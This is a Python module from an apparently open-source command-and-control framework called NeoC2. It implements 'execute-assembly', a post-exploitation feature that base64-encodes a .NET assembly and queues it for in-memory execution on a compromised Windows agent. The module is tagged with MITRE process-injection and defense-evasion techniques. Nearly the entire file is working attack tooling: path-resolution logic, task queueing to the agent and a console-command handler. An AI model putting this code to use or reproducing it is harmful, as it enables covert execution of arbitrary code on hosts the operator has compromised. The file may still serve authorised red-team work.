import os
import base64
import re
from pathlib import Path

def get_info():
    return {
        "name": "execute-assembly",
        "description": "Load and execute .NET assemblies in-memory on agents",
        "type": "post-exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://learn.microsoft.com/en-us/dotnet/core/deploying/single-file/overview",
            ".NET in-memory assembly execution techniques"
        ],
        "technique_id": "T1055,T1620",
        "mitre_tactics": ["Execution", "Defense Evasion"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to execute the .NET assembly on",
                "required": True
            },
            "assembly_path": {
                "description": "Path to the .NET assembly file to execute",
                "required": True
            }
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    assembly_path = options.get("assembly_path")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not assembly_path:
        return {
            "success": False,
            "error": "assembly_path is required"
        }

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    try:
        agent_manager = session.agent_manager

        agent = agent_manager.get_agent(agent_id)
        if not agent:
            return {
                "success": False,
                "error": f"Agent {agent_id} not found"
            }

        # Check if assembly_path is already base64 encoded content (indicates client-side file)
        is_base64_content = _is_base64(assembly_path)

        if is_base64_content:
            # The assembly_path is already base64 encoded content from the client
            encoded_assembly = assembly_path
        else:
            # The assembly_path is a file path, so we need to read the file
            if os.path.isabs(assembly_path) and os.path.exists(assembly_path):
                assembly_full_path = assembly_path
            else:
                possible_paths = [
                    os.path.join(os.path.dirname(__file__), 'external', os.path.basename(assembly_path)),  # modules/external/ location
                    os.path.join(os.path.dirname(__file__), 'external', 'assemblies', os.path.basename(assembly_path)),  # modules/external/assemblies/ location
                    assembly_path,  # Direct relative path
                    os.path.join(os.getcwd(), assembly_path),
                    os.path.join(os.path.dirname(__file__), '..', 'external', os.path.basename(assembly_path)),
                    os.path.join(os.path.dirname(__file__), '..', 'external', 'assemblies', os.path.basename(assembly_path)),
                ]

                found = False
                for path in possible_paths:
                    if os.path.exists(path):
                        assembly_full_path = path
                        found = True
                        break

                if not found:
                    # Look for the file in modules/external directory as well
                    external_dir = os.path.join(os.path.dirname(__file__), 'external')
                    if os.path.exists(external_dir):
                        for item in os.listdir(external_dir):
                            item_path = os.path.join(external_dir, item)
                            if os.path.isfile(item_path) and item == os.path.basename(assembly_path) and item.lower().endswith(('.exe', '.dll')):
                                assembly_full_path = item_path
                                found = True
                                break

                    # Also check in assemblies subdirectory
                    assemblies_dir = os.path.join(os.path.dirname(__file__), 'external', 'assemblies')
                    if os.path.exists(assemblies_dir):
                        for item in os.listdir(assemblies_dir):
                            item_path = os.path.join(assemblies_dir, item)
                            if os.path.isfile(item_path) and item == os.path.basename(assembly_path):
                                assembly_full_path = item_path
                                found = True
                                break

                if not found:
                    assembly_dirs = [
                        os.path.join(os.path.dirname(__file__), 'external', 'assemblies'),
                        os.path.join(os.path.dirname(__file__), 'external'),
                        os.path.join(os.path.dirname(__file__), '..', 'external', 'assemblies'),
                        os.path.join(os.path.dirname(__file__), '..', 'external')
                    ]

                    available_files = []
                    for asm_dir in assembly_dirs:
                        if os.path.exists(asm_dir):
                            for f in os.listdir(asm_dir):
                                if f.lower().endswith(('.exe', '.dll')):
                                    available_files.append(f)

                    return {
                        "success": False,
                        "error": f"Assembly file does not exist: {assembly_path}. Searched in common locations. Available assembly files in modules/external/ and modules/external/assemblies/: {available_files if available_files else ['No files found']}"
                    }

            with open(assembly_full_path, 'rb') as f:
                assembly_content = f.read()

            encoded_assembly = base64.b64encode(assembly_content).decode('utf-8')

        assembly_command = f"assembly {encoded_assembly}"

        if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
            result = {
                "success": True,
                "output": f"[x] .NET assembly execution prepared for interactive mode",
                "command": assembly_command,
                "encoded_assembly_size": len(encoded_assembly)
            }

            session.audit_logger = getattr(session, 'audit_logger', None)
            if session.audit_logger:
                session.audit_logger.log_event(
                    user_id=getattr(session, 'user_id', 'unknown'),
                    action='dotnet_assembly_execute',
                    resource_type='task',
                    resource_id='interactive',
                    details=f".NET assembly execution prepared for interactive mode. Command: assembly <base64_data> ({len(encoded_assembly)} chars encoded)",
                    ip_address='127.0.0.1'
                )

            return result
        else:
            task_id = agent_manager.add_task(agent_id, assembly_command)
            if task_id:
                result = {
                    "success": True,
                    "output": f"[x] .NET assembly execution task queued for agent {agent_id}",
                    "task_id": task_id,
                    "assembly_command": assembly_command,
                    "encoded_assembly_size": len(encoded_assembly)
                }

                session.audit_logger = getattr(session, 'audit_logger', None)
                if session.audit_logger:
                    session.audit_logger.log_event(
                        user_id=getattr(session, 'user_id', 'unknown'),
                        action='dotnet_assembly_execute',
                        resource_type='task',
                        resource_id=task_id,
                        details=f".NET assembly execution queued for agent {agent_id}. Command: assembly <base64_data> ({len(encoded_assembly)} chars encoded)",
                        ip_address='127.0.0.1'
                    )

                return result
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue .NET assembly execution task for agent {agent_id}"
                }

    except Exception as e:
        return {
            "success": False,
            "error": f"Error executing .NET assembly: {str(e)}"
        }


def _is_base64(s):
    try:
        # Check if the string contains only valid base64 characters
        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        # Pad the string if necessary for decoding
        padded = s
        padding_needed = len(s) % 4
        if padding_needed:
            padded = s + '=' * (4 - padding_needed)

        # Try to decode
        decoded = base64.b64decode(padded, validate=True)

        # Re-encode the decoded content
        re_encoded = base64.b64encode(decoded).decode('utf-8')

        # Check if the re-encoded version matches the original when both are padded the same way
        # Pad the original to 4-byte boundary for comparison
        orig_padded = s
        orig_padding_needed = len(s) % 4
        if orig_padding_needed:
            orig_padded = s + '=' * (4 - orig_padding_needed)

        return re_encoded == orig_padded
    except Exception:
        return False


def _handle_assembly_command(command_parts, session):
    try:
        if len(command_parts) < 3:
            return "Usage: assembly <agent_id> <assembly_path>", 'error'

        agent_id = command_parts[1]
        assembly_path = command_parts[2]

        agent_manager = session.agent_manager
        if not agent_manager:
            return "Agent manager not initialized", 'error'

        agent = agent_manager.get_agent(agent_id)
        if not agent:
            return f"Agent {agent_id} not found", 'error'

        options = {
            'agent_id': agent_id,
            'assembly_path': assembly_path,
        }

        module_manager = session.module_manager
        if not module_manager:
            return "Module manager not initialized", 'error'

        loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

        assembly_module = None
        if 'inline-assembly' in loaded_modules_dict:
            assembly_module = loaded_modules_dict['inline-assembly']['module']
        else:
            module_path = os.path.join('modules', 'inline-assembly.py')
            load_success = module_manager.load_module(module_path)
            if load_success or 'inline-assembly' in loaded_modules_dict:
                if 'inline-assembly' in loaded_modules_dict:
                    assembly_module = loaded_modules_dict['inline-assembly']['module']

        if assembly_module and hasattr(assembly_module, 'execute'):
            result = assembly_module.execute(options, session)
            if 'success' in result and result['success']:
                return result.get('output', '.NET assembly execution task queued successfully'), 'success'
            else:
                return result.get('error', 'Unknown error occurred during .NET assembly execution'), 'error'
        else:
            return "Could not load inline-assembly module from modules/inline-assembly.py", 'error'

    except Exception as e:
        return f"Error handling assembly command: {str(e)}", 'error'
